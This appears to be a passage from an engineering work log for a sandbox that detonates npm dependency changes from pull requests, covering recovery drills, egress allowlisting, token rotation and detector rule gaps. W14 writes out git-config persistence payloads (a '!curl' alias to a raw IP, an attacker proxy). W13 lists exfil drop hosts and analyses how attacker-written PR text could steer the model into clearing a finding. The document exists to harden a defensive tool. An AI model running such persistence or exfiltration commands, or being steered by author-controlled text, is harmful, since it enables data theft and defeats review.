   the Brain pins, restart the three services, run the health endpoint.
3. **Drill it**: launch a second instance from the snapshot, point a scratch `CHAMBER_URL` at
   it, run one detonation end to end, then terminate it.

**Acceptance.** A detonation completes against the restored instance and returns a result with
`sensor.pre_seen == true`, with the wall-clock recovery time written down. If the TLS cert is
baked into the AMI, the pinning path must be confirmed, not assumed.

**Rollback.** None needed — this is additive. Remember to terminate the drill instance so it
doesn't cost money or confuse the Brain.

**Gate: before the deadline.** It costs one snapshot and about half an hour, and it is the
difference between a bad hour and a lost submission. **Ask before creating any AWS resource.**

### Nov 3: AMI snapshot taken — `ami-0aaee946a04551341`

The snapshot exists (owner took it while the Chamber was idle), so the "nothing to restore from"
half of W6 is closed. Recovery is now the fast path: launch an instance from
`ami-0aaee946a04551341`, **reassociate the Elastic IP** (below), restart the services, hit
`/health`. No from-scratch provisioning, and because the address is Elastic the pinned TLS cert
stays valid — no cert regeneration or Modal-secret update. What remains unproven is the *drill*
(launching from it end-to-end once), which is quick but not yet done.

### Nov 3: the address is an **Elastic IP** — owner confirmed

This was the open question `docs/CHAMBER_RECOVERY.md` told us to answer "now", and it removes the
worst failure mode. `3.223.99.234` is allocated, not ephemeral, so:

- **A stop/start no longer changes the address**, which means the Brain's pinned certificate
  (`CHAMBER_CA_PEM`, with `IP Address:3.223.99.234` as a SAN) keeps verifying. The scenario where
  every check silently becomes "Could not verify" because the IP moved is off the table for a
  reboot, and for a restore as long as the EIP is reassociated.
- Recovery therefore reduces to: launch from the AMI, **reassociate the Elastic IP**, restart the
  services, check `/health`. No certificate regeneration and no Modal secret update — which was
  the slow, error-prone half of step 4 in the runbook.

**What is still open in W6 is the snapshot itself.** There is no AMI, so a restore has nothing to
restore *from*; the EIP only guarantees the address will be right once something is running at
it. That remains an AWS-console action, and the drill in step 3 remains unrehearsed.

Severity is accordingly lower than it was — the failure mode is now "rebuild from scratch under
time pressure" rather than "rebuild and then discover TLS no longer verifies".

### Nov 4: the drill ran as a side effect of the W8 test — restore demonstrated

The W8 sacrificial replica (`chamber-test`) **was** a launch-from-`ami-0aaee946a04551341`
instance, and it ran real detonations end to end. One benign record from it
(`lodash-benign.json`) shows `sensor.pre_seen == true`, `exit_code == 0`, with the full
exec/connect/file/dns witness present — i.e. an instance restored from the AMI came up, started
its services, and completed a detonation with the per-job sensor witness intact. That is the core
of the step-3 drill: **launch from AMI → services run → detonation completes with
`pre_seen == true`.**

What this did *not* exercise: reassociating the production Elastic IP onto the restored box (the
replica kept its own address) and therefore the pinned-TLS path end to end — but the EIP
mechanics were separately confirmed Nov 3, and the cert stays valid precisely because the address
is Elastic. So the remaining unproven sliver is "reassociate the EIP and hit `/health` over the
pinned cert," a console action, not a from-scratch rebuild. The drill's expensive unknown —
does an AMI-launched Chamber actually detonate? — is now answered yes.

---

## W7 — The reconciler is deployed but has never fired

**Why it matters.** `reconcile_checks` exists to fail checks that a killed Modal worker left
`in_progress`. It is live and scheduled, but I have never watched it reconcile anything, so the
guarantee is untested — and an untested fail-safe is a guess.

**Plan.** Fault-inject on a throwaway PR, in a scratch repo, not the demo repo:
1. Open a PR, let the check reach `in_progress`, then kill the Modal function mid-job.
2. Confirm the check does **not** stay `in_progress`: the reconciler must move it to a
   **failing** "Could not verify" on that exact SHA.
3. Separately push a newer commit while a job is in flight and confirm the older job's result
   does not overwrite the newer head's check.

**Acceptance.** Both scenarios end in a terminal, failing conclusion on the correct SHA, with
the check-run ids recorded. No stale ✅ may survive on any SHA.

**Rollback.** None needed; the test is observational. Do it on a scratch repo so a stuck check
can't appear on a PR you plan to film.

**Gate: before the deadline if time allows after W1 and W6.** It validates a claim we are
already making in the write-up.

### Done locally; the live half is still open

`tests/test_reconcile_drill.py` composes the real `GitHubClient` with `reconcile` over HTTP
against a stateful fake of the check-runs API, and asserts the invariant directly: after a
killed job and a sweep, `open_runs() == []` and `passing_runs() == []`, on the right SHA.
Scenario 2 is covered the same way — the late job concludes `SHA_OLD` and the newer head's check
stays untouched, then fails closed on its own sweep.

**Mutation-tested, with an unflattering result.** Four injected defects (conclude `neutral`
instead of `failure`; wrong check-runs URL; drop the already-completed guard; PATCH without
`status: completed`) were all caught by the drill — and all four were *already* caught by the
existing suite. So the drill buys integration confidence and one readable statement of the
invariant, **not new defect detection**. Recorded here so nobody counts it twice.

**Acceptance is still not met.** It asked for a live fault injection with *recorded check-run
ids*, and these are fakes. Two things remain untested:

- that a hard Modal kill really does skip the exception handler (a property of Modal — the drill
  backdates `started_at` instead of waiting out the 900 s window);
- that `detonate_job` completes its check *before* consulting `head_moved`. The ordering is
  correct in `brain/app.py` by inspection, but `detonate_job` has **no test coverage at all**
  (it is a Modal function that builds `modal.Dict`s at import time), and the drill hand-rolls
  the sequence rather than calling it.

The live drill needs a scratch repo with the App installed — not the demo repo, since a stuck
check must not land on a commit that gets filmed. That is user time competing directly with
recording the video (W1), which is the larger score lever. **Recommendation: leave it, and keep
saying in the write-up that the reconciler is tested but has not been observed firing in
production.** That sentence is cheap and true.

---

## W8 — Sandbox egress is open TCP

**Why it matters.** `chamber/provision/iptables.sh` blocks private ranges, the metadata address
and all non-TCP, and sinkholes known exfil services — then ends in `RETURN`, so arbitrary public
TCP is allowed. A payload can still reach a novel destination. "Network isolated" would be false;
the write-up says so plainly, which is the right position for now.

**Nov 3 — the policy is written; the live test is the owner's VM.** `chamber/provision/egress-policy-v2.sh`
implements the DNS-name allowlist: dnsmasq adds the allowlisted names' resolved IPs to an ipset,
and iptables allows the set and **logs + REJECTs** everything else, so an exfil attempt is
recorded rather than completed. The allowlist and its tiers (T0 registry / T1 + node & github /
T2 + vetted vendor CDNs) come straight from `eval/egress_allowlist.py`, whose offline analysis
predicted the blast radius — at T1 only ~1% of 500 swept packages reach anything else and 0
benign controls are affected. REJECT (not DROP) is chosen so a refused optional fetch fails fast
instead of stalling a benign install into "Could not verify". Syntax-checked; **not** wired into
provisioning and **not** for the live Chamber during judging.

What it still needs is the thing that cannot be done from the dev machine: a **sacrificial
second instance** running the full Chamber stack, to run the acceptance below live. There is no
AWS tooling or credential on the dev box and no AMI to launch from, so this is an owner console
operation — launch a replica (ideally after the W6 AMI exists), apply the script, run the test.
*(Done Nov 4 — the owner launched the replica and the live result is in "Validated live" at the
bottom of this section.)*

**Plan (post-judging).** An egress broker: allow the npm registry and a vetted vendor-download
list, drop everything else **after logging the attempt**, so the attempt remains evidence rather
than vanishing. Then measure install success and review rate on the *same* 104 benign set plus a
fresh 100-package sweep, before and after.

**Acceptance.** Zero unapproved public transmission in a controlled test; benign install success
within 2 packages of today's baseline; connect *attempts* still recorded in telemetry; a
documented rollback to the current rules.

**Measured offline, Nov 3 — the blast radius, which was the unknown blocking this.**
`eval/egress_allowlist.py` (report: [`eval/EGRESS.md`](../eval/EGRESS.md)) predicts the cost of an
allowlist from the host data the sweeps already recorded, with no change to the Chamber:

- **All 500** packages in the 500-package sweep reach `registry.npmjs.org`; only **5** reach
  anything else at all. The whole observed surface is **12 hosts**.
- Blast radius by tier: registry-only puts **37/500 (7.4%)** at risk, but adding the Node and
  GitHub release endpoints drops that to **5/500 (1.0%)**, and adding four vendor CDNs to
  **2/500 (0.4%)**. Every one of those 5 installed cleanly anyway, so their contact was not
  install-critical.
- **Held-out check**, because the tiers were otherwise read off the corpus they scored: fit the
  allowlist on the 500-package sweep, then score the 100-package sweep, which overlaps it by
  only 8 names. Of the **92 genuinely unseen** packages, exactly **1** needs a host outside the
  allowlist — and that one is the package pending disclosure, reaching a raw IP, which the
  detector already returns **Blocked** and whose install did not complete. **Zero benign
  packages affected.**

So the acceptance criterion "within 2 packages of baseline" is predicted to pass with margin at
the T1 tier and above. Pinned by `tests/test_egress_allowlist.py`, which asserts the claim
against the committed corpora rather than restating the number.

**What this does *not* establish**, and why the gate stands: an *upper bound* from observed
contacts is not a live result. A refused connection differs from no connection — `REJECT` fails
fast, but a `DROP` makes a client wait out its own timeout, so a package that tolerates refusal
may still stall. And an allowlist fitted on 500 packages from one sampling of the registry says
nothing certain about the 501st. Only the live run in the plan settles those.

**Validated live, Nov 4 — the acceptance test, on a sacrificial replica.** The owner launched a
second EC2 instance from the Chamber AMI (`chamber-test`, now terminated). Over SSH I installed
`ipset`, took a baseline, applied `egress-policy-v2.sh` at tier T2, and re-detonated the same
manifest: two benign installs (`lodash`, `esbuild`) and one exfil payload (`v08-env-exfil`,
which opens a TCP connection to `203.0.113.10` — a TEST-NET-3 address that is *not* on the
allowlist).

- **Exfil refused and recorded.** With the policy active, the firewall logged and rejected the
  attempt: `DETONATOR-DENIED-EGRESS ... SRC=10.250.0.10 DST=203.0.113.10 ... PROTO=TCP DPT=80 ...
  SYN`. The SYN hit the final `REJECT --reject-with tcp-reset`, so the connection never
  established and the attempt survives as evidence — exactly the "attempt becomes evidence"
  behaviour the plan asked for. Baseline (open-TCP) policy left the same connection unflagged.
- **Zero benign regression.** `lodash` and `esbuild` both installed at `exit=0` under the
  allowlist, identical to baseline — 0 packages lost, inside the "within 2 of baseline"
  criterion. 12 allowlist hosts resolved into the `detonator-allow` ipset, so the registry and
  CDN fetches went through untouched.
- **A real integration bug the live run caught.** The first apply failed: the script assumed a
  `/etc/dnsmasq.d/` drop-in directory, but the Chamber's dnsmasq runs with a single
  `--conf-file=/etc/pr-detonator/dnsmasq.conf` and no drop-in dir. Fixed to append the `ipset=`
  directives between managed markers in that one file (with a `--rollback` that strips them and
  restores baseline iptables). This is the kind of defect only a live apply surfaces, which is
  why the gate held the change until there was a sacrificial box to try it on.

Every acceptance criterion is now met on a live replica: zero unapproved transmission, benign
success within 2 of baseline, attempts recorded in the firewall log, documented rollback.

**Gate: the policy stays off the judged Chamber.** The result lifts this from "honestly
documented open egress" to "allowlist demonstrated to work on a replica," but swapping egress on
the live Chamber two days out still risks a benign-install regression the full control set has no
time to re-validate against. The validated script and its result are the deliverable; flipping it
on is a post-judging change with a now-measured, bounded cost.

---

## W9 — The private-repo path has never been exercised

**Why it matters.** Private repos are cloned on the *host* with a read-only token scoped to one
repo, over pinned TLS, and the token must never enter the sandbox. That path is implemented and
unit-tested but has never run against a real private repo, and `build_record` returning `None`
for private repos has never been confirmed against the live dashboard.

**Plan.** Create a throwaway **private** repo, install the GitHub App on it, open a one-line
dependency PR, and check: the check runs and concludes; the dashboard shows **no** row for it;
the token appears in no log, no model input and no PR comment; revoking the token mid-run
produces a clean "Could not verify" rather than a crash.

**Acceptance.** A real private-repo PR concludes correctly **and** the public dashboard has zero
rows naming that repo, verified by loading it signed-out.

**Rollback.** Delete the repo and uninstall the App from it.

**Gate: before the deadline — it is cheap and it closes a "never demonstrated" row in the
audit.** Needs you to create the repo.

---

## W10 — Modal token not rotated

**Why it matters.** A live `.env` left the machine inside a folder ZIP. `MODAL_TOKEN_SECRET`
authenticates as you to the whole workspace: anyone holding it can deploy a function that mounts
and prints every other Modal secret — including `github-app`, which holds the GitHub App private
key you deliberately kept outside the repo. There is no evidence of compromise; the argument is
asymmetry, not alarm.

**Plan.** `modal token new` (browser flow; rewrites `~/.modal.toml` so no secret is copied by
hand) → **delete the old token at modal.com/settings/tokens**, which is the step that actually
closes it → update or remove the two `MODAL_TOKEN_*` lines in `.env`.

**Acceptance.** `modal token info` shows the new id; a Brain redeploy succeeds; the four demo
PRs still conclude correctly; the old token no longer appears in the dashboard.

**Rollback.** None — do it while no long VM job is running, so there is no half-rotated state.

**Gate: before the deadline. One minute, and it needs your browser.**

---

## W11 — The disclosed package is unfixed and its name is in public git history

**Why it matters.** The report was sent 2026-11-02; there is no response or fix yet. The name and
IP were committed in `07feaba` and only redacted in `f4ee6ec`, and this repo is public — so the
identifier is recoverable from `git log`. We must not claim concealment, and we currently don't.

**Plan.** Hold the name out of prose, the video and all new artifacts. Re-check the published
package weekly for a fixed version. Decide a disclosure date rather than drifting: if there is no
response by **2026-12-02** (30 days), choose explicitly between continued hold and coordinated
publication, and record the decision. **Do not rewrite history** — it would not work (orphaned
objects, forks, caches) and would destroy review evidence.

**Acceptance.** No new artifact contains the identifier; the 30-day decision is recorded in
`eval/SWEEP.md` with a date either way.

**Gate: ongoing. Before filming, confirm no terminal, JSON or `git log` tab on screen shows it.**

---

## W12 — The "independent" red-team set is not blind

**Why it matters.** Gemini Pro *suggested* ten categories; I implemented and scored them in our
own harness. That is better than author-only cases and weaker than external validation, and the
write-up should not imply otherwise.

**Plan (post-judging).** Commission a genuinely held-out set: a third party writes *and* scores
cases against a frozen build, with labels fixed before they see any output, and no case moved
between cohorts afterwards.

**Acceptance.** Results reported with the external party named and the frozen commit recorded,
including anything they found that we miss.

**Checked Nov 3 — the wording this gate exists to control is already correct.**
`docs/SUBMISSION.md` line 207 reads "10 red-team, written by a model that never saw our rules",
and the phrase "independently validated" appears nowhere in it. The one remaining mention is a
submission-checklist item about whether to add a held-out row at all. So W12 needs no action
before submitting; what it needs is a third party, which is a scheduling problem, not a code one.

Note for whoever picks this up: **this cannot be done by the agent that wrote the detector, or by
one it spawns.** W12's acceptance requires labels fixed by someone who has not seen the rules, and
an assistant that has read `brain/rules.py` cannot provide that however the prompt is framed — it
would be the same blindness problem the entry already describes, one level removed.

**Gate: after judging.** Until then the phrasing stays "suggested by a model that had not seen
the rules", never "independently validated".

---

## W13 — The one path where a model decision can clear a rule hit

**Found by an independent audit, Nov 3.** Its wording caveat was correct: the write-up's "rules
set a floor no model can lower" conflated two different model roles, and the precise claim is
narrower.

**What the code actually guarantees.** The *post-run analysis* is escalate-only — `max(rule,
model, extra)` — so a HIGH or CRITICAL rule hit cannot be cleared by any model output. But
`brain/intent.py::apply_contract` *can* clear a hit: a `NET_UNLISTED_DOMAIN` hit at **LOW**
severity whose host the *pre-observation prediction* named before the install ran.

**Why it matters.** The prediction's inputs — title, description, changed file names, added
dependency names — are attacker-controlled. So in principle an author can influence the one
input that can clear a finding. The master plan states this as invariant I06 ("PR-head author
text cannot self-allowlist an attacker-controlled destination"), which makes the exact boundary
worth writing down rather than assuming.

**What bounds it, in code and already tested:**

| Bound | Enforced by | Test |
|---|---|---|
| LOW severity only; HIGH/CRITICAL untouched | `apply_contract` | `test_high_and_critical_hits_are_never_cleared` |
| One rule only (`NET_UNLISTED_DOMAIN`) | `apply_contract` | `test_truncation_hit_never_cleared` |
| Nothing cleared if the PR added install scripts | `metadata.scripts_changed` gate | `test_no_clearing_when_pr_adds_install_scripts` |
| Raw IPs can never be explained | `evaluate_contract` | `test_raw_ip_can_never_be_explained` |
| Shared hosting anyone can publish under is discarded | `_normalize_domain` + `SHARED_HOSTING_SUFFIXES` | `test_predicted_domains_sanitized`, `test_pipeline_puppeteer_gcs_download_stays_needs_review` |
| The prediction never sees the diff | `predict()` input set | `test_prediction_prompt_excludes_diff_and_scripts` |
| Known drop services fire a second, separate rule | `NET_EXFIL_SERVICE` | `test_a_pr_cannot_self_allowlist_a_shared_hosting_exfil_host` |

That blocklist covers the cheap exfil endpoints — `webhook.site`, `ngrok.io`, `*.amazonaws.com`,
`storage.googleapis.com`, `pages.dev`, `trycloudflare.com` and twenty more — so the attack needs
a registered domain of the attacker's own. Several of them are doubly covered: `webhook.site`,
`ngrok.io` and `trycloudflare.com` also raise `NET_EXFIL_SERVICE`, an independent finding that
the contract cannot touch at all.

**The residual, as it stood on Nov 3.** With such a domain, and a PR body whose stated purpose
plausibly requires it, the prediction could name it and that one LOW signal was suppressed. The
last line of defence was a *prompt* instruction — "Never predict a host just because the text
names it" — which is a model behaviour, not a code guarantee.

### Closed in code, Nov 3 — I06 is now a property of `apply_contract`

The gate below was moved forward deliberately (owner's call) and the fix shipped. Clearing now
requires **two independent keys**:

> the prediction named the host **AND** the host is on a list the PR author cannot write to

The second list is `brain/intent.py::VENDOR_DOWNLOAD_DOMAINS` — six hosts that publish a
package's own prebuilt binaries — plus any `allowed_domains` from the **base**-branch policy
(`brain/policy.py`, already read from the base precisely because the head is the author's).
Author text can only *select* from those lists; it can never extend them.

**Admission rules for the vendor list**, enforced by `test_no_vendor_entry_is_shared_hosting_or_a_bare_registrable_domain`
rather than left to discipline: a full hostname with ≥3 labels (`domain_allowed` matches
subdomains, so `prisma.sh` would also accept `evil.prisma.sh`), operated by the publisher of the
package that fetches it, and never a `SHARED_HOSTING_SUFFIXES` host. `storage.googleapis.com` is
**deliberately excluded** even though adding it would turn `puppeteer` and `chromedriver` green:
anyone can create a bucket there, so it is not a host the vendor owns. That exclusion has its own
test, because the temptation is real.

**Acceptance, met and measured:**

| Condition | Result |
|---|---|
| Benign "needs review" within 2 of 3/104 | **0 change.** Still 3 |
| Zero attack cases become clearable | **Holds by construction** — a conjunct can only shrink the cleared set |
| A crafted PR naming an attacker-registered domain cannot clear its own LOW hit | **Asserted** (`test_an_attacker_registered_domain_cannot_clear_its_own_low_hit`, the inverted former residual test) |

**Why no re-score was needed, decided from data rather than argued.** Adding a conjunct can only
*shrink* what gets cleared, so the only way a verdict moves is if something that was cleared is
no longer trusted. `eval/results.json` records the exact hosts cleared across all 142 cases, and
there are three — `binaries.prisma.sh`, `cdn.playwright.dev`, `download.cypress.io` — all on the
vendor list. `test_the_fix_changes_no_verdict_in_the_stamped_evaluation` asserts that against the
stamped file, so the claim re-checks itself instead of relying on this paragraph.

For scale: clearing moved exactly **one verdict in 142 cases** before this change (`prisma`,
Needs review → Clean). `playwright-chromium` and `cypress` had a host cleared and kept their
verdicts anyway. So the feature's entire measured benefit was one row, and it is preserved.

The same test also fails if the vendor list grows a host **no benign control ever needed** — which
it did on the first run, catching `playwright.download.prss.microsoft.com`, a host that was
observed but never predicted. It was removed rather than justified.

**Mutation-tested**, 3/3 caught, each by a different test: dropping the trusted-list conjunct,
admitting shared hosting, and making the trusted list the *only* key (ignoring the prediction).

**Residual after the fix.** The vendor list is a judgement call someone has to own — six hosts,
each tied to a package in the control set. If one of those vendors were compromised at their own
CDN, a predicted fetch from it would still be cleared. That is a supply-chain assumption, not an
author-controlled path, and it is the assumption `DEFAULT_ALLOWED_DOMAINS` already makes about
`registry.npmjs.org`.

---

## W14 — `git config` and `.git/hooks` are an untraced attack surface

**Found by the held-out blind corpus, Nov 3** (`eval/BLIND_RESULTS.md`). Three of that set's four
rules-level misses share one root cause: an install script can arrange code to run on *later*
git activity, and nothing inspects it.

- `git config --global alias.X '!curl http://<raw-ip>/…'` — a command fires on later git use
  (`bc04`).
- `git config --global http.proxy http://<attacker>` — future git HTTP traffic is MITM'd
  (`bc10`).
- writing an executable `.git/hooks/post-checkout` that beacons on the next checkout (`bc03`).

**Why the rules miss it.** All three are **dormant at install time**: the payload does not
connect, drop a binary, or touch a traced persistence path while the sandbox is watching, so no
behavioural rule has anything to fire on. Note the exec of `git config …` *is* captured — in
`bc04` and `bc10` the raw IP is right there in the recorded args — so the evidence exists; no
rule reads `git config` arguments, and the persistence policy does not cover `.git/hooks/` or
`~/.gitconfig`.

**Closed in rules, Nov 3 — the git-config half.** `EXEC_GIT_CONFIG_PERSIST` (HIGH) flags
`git config` writing `http.proxy`/`https.proxy`, `core.hookspath`, `core.fsmonitor`, an
`alias.*` whose value is a `!`-prefixed shell command, or `url.*.insteadOf`. It was shipped on
the same measured basis as `EXEC_SCHEDULED_PERSISTENCE`: **`git config` appears 0 times across
all 742 recorded installs** (142 eval + 604 uncurated), so 0 false positives. This takes the
blind set's rules floor from 6/10 to 8/10 (`bc04`, `bc10`), and turns `bc10` from the model's
mergeable needs-review into a deterministic block. The stamped eval is unchanged — the rule
fires on none of the 142 cases (`eval/score_rules.py --verify` still reports only the `gm05`
drift). 20 tests, mutation-tested 4/4.

**The `.git/hooks` half (`bc03`) is out of scope, not open — confirmed by investigation.** A
payload writing `.git/hooks/post-checkout` lands **nothing** in our sandbox: `chamber/detonate.py`
strips `.git` after the clone and before the install (`shutil.rmtree(dest / ".git")`, line ~179,
before the detonation), so the write throws ENOENT and is swallowed. bc03's telemetry confirms it
— the script ran, no file event beyond npm's own `~/.npmrc` read, exit 0. There is nothing to
trace because nothing happens. Stripping `.git` is deliberate hardening (we never let the cloned
repo's own git machinery run), and it happens to neutralise this whole technique *for our
detonation model*. The model still catches the intent from source. So this is a documented scope
boundary, like "install-time only" — not a tunable rule and not a Chamber change worth making.

## W15 — the DNS encoded-label rule has a length floor a short label evades

**Found by the held-out blind corpus, Nov 3.** `DNS_ENCODED_LABEL` fires on an encoded-looking
label of `MIN_ENCODED_LABEL = 40`+ characters. `bc08` hex-encodes a hostname into a **24-char**
label — real exfiltration of a short identifier — which sits under the floor, so the rule stays
silent even though the DNS query is captured in full.

**Why the floor exists, and why it cannot just be lowered.** The threshold is there to avoid
flagging legitimate long-ish labels — CDN cache keys, content-addressed hashes, telemetry ids —
which are common and benign. Lowering it trades directly against the benign false-positive rate.

**Closed in code, Nov 3 — with the measurement the gate asked for.** The label-length and
character-class distribution across the 742-install corpus turned out to separate cleanly: the
**only** all-hex DNS labels of 16+ characters belong to attack cases (`m11` at 60, `bc08` at
24), while the longest benign hex label is a 14-char CDN hash. So an *all-hex* label — a far
stronger exfil signal than a merely digit-heavy one — gets a lower floor of **20**, catching
`bc08` with **0 false positives across all 742 installs**. The digit-fraction heuristic keeps
its conservative 40-char floor, so CDN cache keys and content hashes (digit-heavy but not pure
hex) are unaffected. `DNS_ENCODED_LABEL` stays at HIGH (⚠️ human review), never a lone
irreversible block, because 742 installs is not the world: a benign host with a 20+ char all-hex
subdomain would trip it, and a reviewer is the backstop. The stamped eval is unchanged — `m11`
fired at the old floor too, so no verdict moved (`eval/score_rules.py --verify` confirms).

---

## Recommended order

**Today / tomorrow morning:** W4(a) wording fix → W10 rotate → W6 AMI snapshot and drill →
**W1 film** → W9 private repo if the morning allows.

**Only if the above are done and measured:** W7 reconciler drill, then W2 best-of-N *if and only
if* its four acceptance conditions pass.

**Explicitly deferred to after judging:** W3, W4(b), W5, W8, W12 — each for a stated reason, not
because they were forgotten.

**The standing trade:** a working, honestly-described demo beats an unvalidated improvement. If
an item here threatens the demo and cannot be fully validated before the deadline, it waits.
